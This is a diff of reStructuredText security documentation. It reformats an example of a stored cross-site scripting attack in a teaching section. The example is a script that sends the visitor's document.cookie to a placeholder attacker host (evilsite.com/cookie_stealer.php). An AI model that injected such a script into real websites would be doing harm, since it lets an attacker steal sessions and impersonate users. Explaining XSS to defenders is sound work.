@@ -160,9 +160,10 @@ Example of Cross-Site Scripting:
 	  the hacker to impersonate the user who looked at the website. [xss-attacks]_ 
 	 
 	* Attack: 
-		``<script>``
-			``window.open("http://evilsite.com/cookie_stealer.php?cookie=" + document.cookie, "_blank");``
-		``</script>``
+	
+	  ``<script>``
+		``window.open("http://evilsite.com/cookie_stealer.php?cookie=" + document.cookie, "_blank");``
+	  ``</script>``
 
 	
 * Reflective XSS: Similar to above, except that the user would have to click on the link 
